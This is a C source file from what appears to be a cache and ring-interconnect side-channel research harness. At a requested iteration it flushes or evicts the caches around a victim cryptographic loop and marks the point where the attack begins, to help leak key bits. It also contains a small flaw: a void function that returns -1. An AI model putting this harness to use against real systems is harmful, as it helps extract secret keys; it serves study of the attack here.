#include "lotr.h"
#include "pmparser.h"

#define BUF_SIZE 100 * 1024UL * 1024 /* Buffer Size -> 100*1MB */

static volatile struct sharestruct *mysharestruct = NULL;
static struct Node *eviction_sets[L2_CACHE_SETS];
static void *buffer;
static int iteration_counter;


void prepare_for_attack(uint8_t *attacking) {

	if(!mysharestruct) { mysharestruct = get_sharestruct(); }

	mysharestruct->iteration_of_interest_running = 0;
	iteration_counter = 0;
	*attacking = 0;

	static uint8_t first_time = 1;
	if (first_time == 1 && mysharestruct->cleansing_mechanism == 2) {
		first_time = 0;

		// Initialize eviction sets
		for (int k = 0; k < L2_CACHE_SETS; k++) {
			eviction_sets[k] = NULL;
		}

		// Allocate large buffer (pool of addresses)
		buffer = mmap(NULL, BUF_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
		if (buffer == MAP_FAILED) {
			perror("mmap");
			exit(1);
		}

		// Write data to the buffer so that any copy-on-write
		// mechanisms will give us our own copies of the pages.
		memset(buffer, 0, BUF_SIZE);

		// Initialize size of sets
		uint32_t number_of_addresses[L2_CACHE_SETS];
		for (int k = 0; k < L2_CACHE_SETS; k++) {
			number_of_addresses[k] = 0;
		}

		// Go through addresses in the buffer
		uint64_t offset = 0;
		uint32_t number_of_sets_done = 0;
		while (number_of_sets_done != L2_CACHE_SETS) {

			uint32_t set_index = get_cache_set_index((uint64_t)buffer + offset, 2);
			if (number_of_addresses[set_index] < L2_CACHE_WAYS) {
				append_string_to_linked_list(&eviction_sets[set_index], (void *)((uint64_t)buffer + offset));
				number_of_addresses[set_index] += 1;
				offset += PAGE;

				if (number_of_addresses[set_index] == L2_CACHE_WAYS) {
					number_of_sets_done += 1;
				}
			}

			offset += CACHE_BLOCK_SIZE;
		}
    }
}

void check_attack_iteration(uint8_t *attacking) {

	iteration_counter += 1;

	// If this is the iteration the receiver is interested in
	// Starts from 1 and goes all the way up to the key length
	if (iteration_counter == mysharestruct->sign_requested) {

		// Reset the request variable
		mysharestruct->sign_requested = 0;

		// 1 for clflush the address space; 2 for evicting L1 and L2 only
		if (mysharestruct->cleansing_mechanism == 1) {

			int pid = -1; // -1 to use the running process id, use pid>0 to list the map of another process
			procmaps_iterator* maps = pmparser_parse(pid);
			if (maps == NULL) {
					fprintf(stderr, "[map]: cannot parse the memory map of %d\n", pid);
					return -1;
			}

			// Iterate over memory areas
			procmaps_struct* maps_tmp=NULL;                
			while( (maps_tmp = pmparser_next(maps)) != NULL) {
				
				// These addresses can't be flushed so skip them
				if (maps_tmp->is_r == 1 && maps_tmp->is_w == 0 && maps_tmp->inode == 0) {
					// pmparser_print(maps_tmp,0);
					// printf("\n~~~~~~~~~~~~~~~~~~~~~~~~~\n"); 
					continue;
				}
				
				if (maps_tmp->is_r == 1) {
					void *cache_line;
					for (cache_line = maps_tmp->addr_start; cache_line < maps_tmp->addr_end; cache_line += CACHE_BLOCK_SIZE) {
						_mm_clflush(cache_line);
					}
				}
			}

			// Mandatory: should free the list
			pmparser_free(maps);

		} else if (mysharestruct->cleansing_mechanism == 2) {

			struct Node *current;
			for (int k = 0; k < L2_CACHE_SETS; k++) {
				for (int ii = 0; ii < 2; ii++) {
					current = eviction_sets[k];
					while (current && current->next) {
					// while (current && current->next && current->next->next) {
						maccess(current->address);
						maccess(current->next->address);
						// maccess(current->next->next->address);
						maccess(current->address);
						maccess(current->next->address);
						// maccess(current->next->next->address);
						current = current->next;
					}
				}
			}

			flush_l1i();
		}

		// Bring attack code back to the cache
		cryptoloop_check_a(attacking);
		cryptoloop_check_b(attacking);

		// Mark the attack as started
		*attacking = 1;
		mysharestruct->iteration_of_interest_running = 1;
		_mm_lfence();
	}
}

void cryptoloop_check_a(uint8_t *attacking) {
	if (*attacking == 0) {
		return;
	} else if (*attacking == 3) {
		mysharestruct->iteration_of_interest_running = 0;
		*attacking = 0;

		// What bit was actually being processed in this iteration?
		// 0 because attacking = 3 before A only if preceded by AA
		// Print ground truth.
		// fprintf(stderr, "0\n");	// FIXME: uncomment if needed

	} else if (*attacking == 4) {
		mysharestruct->iteration_of_interest_running = 0;
		*attacking = 0;

		// What bit was actually being processed in this iteration?
		// 1 because attacking = 4 before A only if preceded by AB
		// Print ground truth.
		// fprintf(stderr, "1\n");	// FIXME: uncomment if needed

	} else {
		*attacking += 1;
	}
}

void cryptoloop_check_b(uint8_t *attacking) {
	if (*attacking == 0) {
		return;
	} else if (*attacking == 3) {
		mysharestruct->iteration_of_interest_running = 0;
		*attacking = 0;

		// What bit was actually being processed in this iteration?
		// 0 because attacking = 3 before B only if preceded by AA
		// Print ground truth.
		// fprintf(stderr, "0\n");	// FIXME: uncomment if needed

	} else {
		*attacking += 2;
	}
}
